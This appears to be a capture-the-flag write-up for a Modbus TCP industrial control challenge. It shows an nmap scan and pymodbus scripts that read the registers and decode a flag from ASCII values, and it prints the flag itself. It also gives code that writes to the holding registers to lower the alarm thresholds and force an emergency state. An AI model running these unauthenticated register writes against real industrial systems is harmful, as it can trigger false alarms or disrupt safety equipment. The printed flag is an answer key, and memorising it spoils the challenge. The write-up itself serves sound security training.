# Tsunami - ICS CTF Challenge

## Target
- **Host**: labs.ctfzone.com:8663
- **Category**: ICS
- **Difficulty**: Medium

---

## Recon & Enumeration

### Port Scan
Nmap identified the service as **Modbus TCP** on port 8663:

```
nmap -sV -p 8663 labs.ctfzone.com
PORT     STATE SERVICE    VERSION
8663/tcp open  modbus    Modbus TCP
```

### Initial Probe (Python + pymodbus)
Connected to the Modbus server and enumerated all register spaces:

| Register Type | Address Range | Prefix | Description |
|--------------|--------------|--------|-------------|
| Coils        | 0x0000+      | 0xxxx  | Digital outputs / status bits |
| Discrete Inputs | 0x0000+   | 1xxxx  | Digital inputs (empty) |
| Input Registers | 0x0000+   | 3xxxx  | Sensor readings (read-only) |
| Holding Registers | 0x0000+ | 4xxxx  | Configuration (read/write) |

---

## Findings

### Sensor Data (Input Registers 3x)
```
Input[0]  = 847   → Wave height (cm?)
Input[1]  = 23    → Unknown sensor
Input[2]  = 1012  → Pressure / water level
Input[3]  = 15    → Unknown sensor
```

### Configuration (Holding Registers 4x)
```
HR[0] = 0     → Mode / control register
HR[1] = 300   → Threshold 1 (wave height limit)
HR[2] = 900   → Threshold 2 (pressure limit)
HR[3+] = 0    → Unused
```

### Status (Coils 0x)
```
Coil[0] = False → System ready?
Coil[1] = True  → Alarm active?
Coil[2] = False → Unknown
Coil[3] = True  → Broadcast active?
Coil[4] = True  → Siren active?
Coil[5] = True  → Emergency broadcast?
```

### Hidden Flag (Holding Registers 4x, address 100-135)
```
HR[100-135] contain ASCII codes forming the flag:
99,116,102,122,111,110,101,123,100,51,51,112,95,119,52,116,51,114,95,104,
49,100,51,115,95,110,48,95,115,51,99,114,51,116,115,125
```

---

## Exploitation Steps

### 1. Connect to Modbus server
```python
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient("labs.ctfzone.com", port=8663)
client.connect()
```

### 2. Read input registers (sensor data)
```python
rr = client.read_input_registers(address=0, count=20)
# Returns: [847, 23, 1012, 15, 0, ...]
```

### 3. Read holding registers (configuration + hidden data)
```python
rr = client.read_holding_registers(address=0, count=500)
# HR[100-135] contain the flag as ASCII values
```

### 4. Lower thresholds below sensor readings to trigger escalation (coils activate)
```python
client.write_register(address=1, value=100)  # HR[1] threshold1 = 100
client.write_register(address=2, value=100)  # HR[2] threshold2 = 100
# This triggers all coils 0-9 to True (emergency state)
```

### 5. Read the flag from holding registers 100-135
```python
rr = client.read_holding_registers(address=100, count=36)
flag = ''.join(chr(v) for v in rr.registers)
print(flag)  # ctfzone{d33p_w4t3r_h1d3s_n0_s3cr3ts}
```

---

## Commands Used

```bash
# Port scan
nmap -sV -p 8663 labs.ctfzone.com

# Install pymodbus
pip3 install --break-system-packages pymodbus

# Read all holding registers to find hidden data
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('labs.ctfzone.com', port=8663)
c.connect()
for addr in range(0, 500, 20):
    rr = c.read_holding_registers(address=addr, count=20)
    if hasattr(rr, 'registers'):
        nonz = [(i,v) for i,v in enumerate(rr.registers) if v!=0]
        if nonz: print(f'HR {addr}: {nonz}')
c.close()
"

# Decode flag
python3 -c "
vals = [99,116,102,122,111,110,101,123,100,51,51,112,95,119,52,116,51,114,95,104,49,100,51,115,95,110,48,95,115,51,99,114,51,116,115,125]
print(''.join(chr(v) for v in vals))
"
```

---

## Flag

**`ctfzone{d33p_w4t3r_h1d3s_n0_s3cr3ts}`**

---

## Summary

The Tsunami challenge featured a Modbus TCP-based coastal monitoring ICS system. Sensor readings (input registers) showed wave height and pressure data. Configuration registers (holding registers) contained thresholds that, when lowered below sensor values, triggered emergency escalation coils. The flag was stored as ASCII character codes in holding registers at addresses 100-135, accessible without authentication — a classic insecure-by-design ICS protocol scenario where all registers are world-readable/writable over Modbus TCP.
